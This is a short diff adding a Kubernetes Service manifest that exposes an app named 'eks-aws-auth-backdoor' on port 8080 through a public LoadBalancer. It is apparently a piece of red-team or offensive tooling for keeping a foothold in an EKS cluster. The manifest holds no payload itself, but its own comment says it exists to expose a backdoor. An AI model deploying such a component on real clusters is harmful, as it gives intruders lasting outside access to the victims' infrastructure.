@@ -1,0 +1,14 @@
+# loadBalancer service to expose the backdoor
+apiVersion: v1
+kind: Service
+metadata:
+  name: eks-aws-auth-backdoor
+  labels:
+    app: eks-aws-auth-backdoor
+spec:
+  type: LoadBalancer
+  ports:
+    - port: 8080
+      targetPort: 8080
+  selector:
+    app: eks-aws-auth-backdoor
